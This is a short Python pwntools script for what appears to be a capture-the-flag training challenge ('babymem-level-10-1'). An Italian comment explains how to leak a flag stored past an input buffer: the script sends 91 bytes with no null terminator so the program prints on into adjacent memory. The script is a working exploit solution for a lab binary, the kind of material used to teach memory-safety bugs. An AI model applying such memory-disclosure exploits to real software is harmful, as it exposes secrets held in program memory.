#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
In questa challenge è attivo il canary, pertanto non è possibile eseguire un attacco di buffer overflow come nelle precedenti.
Tuttavia la flag viene letta dal programma prima di acquisire l'input dall'utente e l'input acquisito viene poi stampato.
Quindi, è possibile far stampare al programma il contenuto della memoria successivo al buffer dove viene salvato l'input acquisito,
fornendo semplicemente come input una stringa senza il carattere di terminazione '\0'. Il programma stamperà la stringa, ma non essendoci 
il carattere di terminazione proseguirà stampando il contenuto della memoria, dove si trova la flag.
Per procedere con l'attacco si fornisce al programma una stringa di dimensione pari alla distanza tra l'inizio del buffer e la flag,
dato che la memoria successiva è occupata, non viene inserito in automatico '\0' alla fine della stringa. 
-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-10-1')
p = elf.process()

delta_len = 91
bytestream = b'A' * delta_len

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
